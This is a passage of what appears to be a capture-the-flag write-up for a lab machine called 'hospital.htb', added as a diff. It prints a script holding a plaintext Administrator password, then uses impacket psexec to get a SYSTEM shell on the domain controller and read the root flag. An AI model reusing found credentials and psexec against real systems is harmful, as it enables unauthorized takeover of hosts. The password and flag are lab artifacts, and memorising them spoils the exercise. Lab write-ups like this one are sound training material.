+from selenium.webdriver.support import expected_conditions as EC                                                                                            
+from selenium.webdriver.common.keys import Keys                                                                                                             
+import pyautogui                                                                                                                                            
+import time                                                                                                                                                 
+                                                                                                                                                            
+pyautogui.FAILSAFE = False                                                                                                                                  
+driver = webdriver.Ie()                                                                                                                                     
+driver.maximize_window()                                                                                                                                    
+try:                                                                                                                                                        
+        driver.get('https://localhost')                                                                                                                     
+        time.sleep(3)                                                                                                                                       
+        driver.find_element('id', 'moreInfoContainer').click()                                                                                              
+        time.sleep(3)                                                                                                                                       
+        driver.find_element('id', 'overridelink').click()                                                                                                   
+        time.sleep(3)                                                                                                                                       
+        user_box = WebDriverWait(driver, 10).until(EC.presence_of_element_located(('id', 'rcmloginuser')))                                                  
+        user_box_xy = user_box.location 
+        pass_box = driver.find_element('id', 'rcmloginpwd')
+        pass_box_xy = pass_box.location 
+        while True:
+                user_box.clear()
+                user_box.click()
+                pyautogui.typewrite('Administrator', interval=1.3)
+                time.sleep(3)
+                pass_box.clear()
+                pass_box.click()
+                pyautogui.typewrite("Th3B3stH0sp1t4l9786!", interval=1.3)
+                time.sleep(117)
+finally:
+        driver.quit()
+```
+
+The password's right there in plain text. I'll show the process of getting a shell as administrator here. With psexec, it's simple:
+
+```
+└─$ /usr/share/doc/python3-impacket/examples/psexec.py hospital.htb/administrator@dc.hospital.htb
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Requesting shares on dc.hospital.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file cWKeXhSz.exe
+[*] Opening SVCManager on dc.hospital.htb.....
+[*] Creating service fGto on dc.hospital.htb.....
+[*] Starting service fGto.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.4974]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+We can obtain root.txt too:
+
+```
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+a07c773ffcbd53c149be83c2087bac90
+```
+
